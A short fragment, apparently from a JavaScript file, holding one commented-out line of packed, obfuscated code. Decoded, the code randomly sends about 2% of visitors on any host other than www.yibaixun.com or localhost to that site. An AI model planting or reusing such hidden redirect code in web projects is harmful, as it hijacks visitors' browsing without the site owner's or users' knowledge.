...
//eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('7 0=g.2.0;7 3=a(b*9.8());f(3<=1&&(0!==\'5.6.4\'&&0!==\'e\')){c.2=\'d://5.6.4\'}',17,17,'host||location|ran|com|www|yibaixun|var|random|Math|parseInt|100|document|http|localhost|if|window'.split('|'),0,{}));
